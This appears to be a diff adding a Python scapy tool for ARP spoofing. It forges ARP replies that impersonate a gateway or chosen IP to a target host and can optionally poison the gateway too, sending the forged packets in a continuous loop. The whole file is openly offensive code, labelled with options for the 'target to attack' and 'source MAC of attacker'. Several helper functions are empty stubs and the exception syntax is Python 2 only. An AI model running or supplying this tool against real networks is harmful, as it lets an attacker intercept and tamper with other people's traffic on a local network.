@@ -1,0 +1,61 @@
+#!/usr/bin/env python
+
+from optparse import OptionParser
+from scapy.all import sendp, ifaces, Ether, ARP
+
+def printInterfaces():
+    for iface in ifaces.keys():
+        print(iface)
+
+def getGatewayMac():
+    pass
+    
+def getGatewayIP():
+    pass
+    
+def getIfaceMAC():
+    pass
+        
+def main():
+    usage = "usage: %prog [options] <-i interface> <-t IP to impersonate>"
+    parser = OptionParser(usage)
+    parser.add_option('-t', '--targetIP', help='IP of target to attack')
+    parser.add_option('-p', '--impersonateIP', default=getGatewayIP(), help='IP to impersonate')
+    parser.add_option('-i', dest='interface', help='specify interface to MAC spoof on')
+    parser.add_option('-s', dest='sourceMAC', default=getIfaceMAC(), help='source MAC of attacker')
+    parser.add_option('-d', dest='delay', type='float', default=1.0, help='delay in seconds between packets broadcasted')
+    parser.add_option('-gw',dest='spoof_gw', action='store_true', default=False, help='spoof gateway as well')
+    
+    options, args = parser.parse_args()
+    
+    targetIP        = options.targetIP
+    interface       = options.interface
+    impersonateIP   = options.impersonateIP
+    sourceMAC       = options.sourceMAC
+    delay           = options.delay
+    spoof_gw        = options.spoof_gw
+    
+    for manadatory_option in (targetIP, interface):
+        if manadatory_option == None:
+            print(parser.usage)
+            print("iterfaces:")
+            printInterfaces()
+            exit(0)
+        
+    target_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=impersonateIP, pdst=targetIP)
+    spoof_pkts = [target_arp_spoof_pkt]
+    
+    if spoof_gw == True:
+        gw_arp_spoof_pkt = Ether() / ARP(op='is_at', hwsrc=sourceMAC, psrc=targetIP, pdst=getGatewayIP())
+        spoof_pkts.append(gw_arp_spoof_pkt)
+        # divide by 2 to accommodate sending a packet to target and a separate packet to gateway
+        delay /= 2
+    
+    try:
+        sendp(spoof_pkts, inter=delay, loop=True)
+    except KeyboardInterrupt, SystemExit:
+        exit(0)
+    
+   
+if __name__ == "__main__":
+    main()
